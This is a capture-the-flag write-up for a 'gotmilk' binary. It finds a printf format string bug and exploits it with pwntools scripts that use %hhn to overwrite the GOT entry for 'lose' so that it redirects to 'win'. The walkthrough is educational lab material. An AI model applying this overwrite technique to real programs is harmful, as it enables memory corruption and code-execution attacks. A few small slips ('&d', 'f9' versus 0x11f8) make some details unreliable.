# Got Milk Exploit
Connor Onweller and Sophia Freaney

## Exploring
We've got the following files:

```
7got_milk
├── gotmilk
└── libmylib.so
```
We have a library `libmylib.so` and an executable called `gotmilk`.

We probably need do something with that library, but let's ignore it for now and try
and run `gotmilk`:

```sh
./gotmilk
```

When we do this, we get the following error:
```
./gotmilk: error while loading shared libraries: libmylib.so: cannot open
shared object file: No such file or directory
```

So we need to specify the library path so the executable can find
`libmylib.so`. We can do this with:

```sh
export LD_LIBRARY_PATH=.
```

Now if we run `./gotmilk` we get the following output:

```
Simulating loss...

No flag for you!
Hey you! GOT milk? Yes please
Your answer: Yes please

No flag for you!
```

We don't GOT milk. :(

Now let's use `ltrace` to see whats going on. This will show us
what library functions are being called in the executable, and what arguments
are passed into them.

```sh
ltrace ./gotmilk
```

This gives us the following output:

```
__libc_start_main(0x80485f6, 1, 0xffc4cee4, 0x80486d0 <unfinished ...>
setvbuf(0xf7ebed20, 0, 2, 0)                                                                                  = 0
setvbuf(0xf7ebe580, 0, 2, 0)                                                                                  = 0
setvbuf(0xf7ebec80, 0, 2, 0)                                                                                  = 0
puts("Simulating loss..."Simulating loss...
)                                                                                    = 19
lose(0, 0xca0000, 1, 0xf7f0a800
No flag for you!
)                                                                              = 18
printf("Hey you! GOT milk? "Hey you! GOT milk? )                                                                                 = 19
fgets(A lil... as treat
"A lil... as treat\n", 100, 0xf7ebe580)                                                                 = 0xffc4cdcc
printf("Your answer: "Your answer: )                                                                                       = 13
printf("A lil... as treat\n"A lil... as treat
)                                                                                 = 18
lose(0, 0xca0000, 1, 0x696c2041
No flag for you!
)                                                                              = 18
+++ exited (status 0) +++
```

From this, we see 2 notable things:

1. There's a `lose` function in `libmylib.so` which prints `No flag for you!`. We
   should checkout this library to see what else there is
2. It looks like our inputted string is passed directly into a `printf`
   statement, meaning there might be a format string vulnerability

### What's boppin in libmylib.so?

To see what functions `libmylib.so` contains, we can run `rabin2`,
which is a binary program info extractor. When we pass the `-s` flag into
the command, we specify that we want to get back a list of export symbols from
the binary.

```sh
rabin2 -s libmylib.so
```

From the output we can see there's a `lose` function and a `win` function:

```
10   0x000011f8 0x000011f8 GLOBAL FUNC   49       lose
11   0x00001189 0x00001189 GLOBAL FUNC   111      win
```

This win function probably `cat`s the contents of some file or something
similar. We should now look for relevant strings that might contain a filename with
the following:

```sh
rabin2 -z libmylib.so
```

Output:

```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002002 0x00002002 8   9    .rodata ascii flag.txt
1   0x0000200b 0x0000200b 17  18   .rodata ascii \nNo flag for you!
```

The filename is `flag.txt`. Since we don't have this file already we can
make one:

```sh
echo My bones > flag.txt
```

# What's going on with all this printf stuff?

Now we want to see if the 2nd call `printf` is printing our inputted string
directly. We can test it out by trying to pass it some `printf` flags in our
text.

With the following input:

```
Hey you! GOT milk? %x %x %x
```

We get this output:
```
Your answer: 64 f7f6f580 804866f
```

Look's like we got a format string vulnerability.

This means that, since we're already able to push to the stack with the our
input, we can likely write anywhere in memory by exploiting this `printf` call.
This is because `printf` accepts the flag `%n`, which will write the number of
characters printed thus far to the address argument associated with the flag.

For example, consider the following code:

```c
int main(int argc, char ** argv) {
    int a;
    printf("123%n", &a);    // will print 123
    printf("&d", a);        // will print 3
    return 0;
}
```

The value 3 will be written to `a` since 3 characters were printed before the
`%n` in the first `printf` statement.

This is useful for us, since it means we can overwrite values stored anywhere
in memory with the number of characters printed so far. In our case we probably
want to overwrite the `lose` function to execute the `win` function.

To do so, we need to overwrite the value stored in the GOT for `lose` with
address of the `win` function.

> **Note:** the GOT is the Global Offset Table. It is used the dynamic linking
> process to help us find where linked symbols are.

Now all we have to do is figure out where the `GOT` entry for `lose` is, what
the address for `lose` and `win` are in our library file, and overwrite the
`GOT` entry for `lose` to contain the address of `win`.

## Lets start pwning

First lets figure out where our input is going going on the stack, so know what
argument will contain the address of the `lose` entry we want to pass to `%n`
in our print statement. We can do this by printing a bunch of `A`s followed by
some flags and trying to find which argument our `A`s are:

```python
from pwn import *

payload = b"A"*10

for i in range(1,11):
    payload += f" {i}:%x".encode()

p = process('./gotmilk')
p.sendline(payload)
print(p.recv())
```

We get the following string printed:

```
1:64 2:f7f33580 3:804866f 4:0 5:ca0000 6:1 7:41414141 8:41414141 9:31204141 10:2078253a
```

It looks like the `A`s are the 7th argument (A in binary is 41)

Now we need to figure out what the address of `win` and `lose` are in the
library:

```python
from pwn import *

lib = ELF('./libmylib.so')

print(hex(lib.symbols['lose']))  # 0x11f8
print(hex(lib.symbols['win']))   # 0x1189
```

It looks we'll just have to overwrite the last part of `lose`'s address to be
`89` instead of `f9`.

Lets try and do this now, first we need to get the address of `GOT` entry of
`lose`, then we need to overwrite the last byte of `lose` to be `89` instead of
`f9`.

```python
from pwn import *

elf = ELF('./gotmilk')

lose_got = elf.got['lose']
pad_sz = 0x89 - 4  # minus 4 since lose_got address is 4 bytes
arg_loc = 7


payload = p32(lose_got)
payload += f"%{pad_sz}x".encode()  # We need to pad our print with enough
                                   # characters so that we print 0x89 characters

payload += f"%{arg_loc}$hhn".encode()  # We say hhn instead of n to specify we
                                       # only want to write 1 byte, not 4

p = process('./gotmilk')
p.sendline(payload)
print(p.recv())
```

We get:

```
Out[1]: b'Simulating loss...\n\nNo flag for you!\nHey you! GOT milk? Your answer: \x10\x
a0\x04\x08
                                                     64\nMy bones\n'
```

Ladies and gentleman... we got milk.
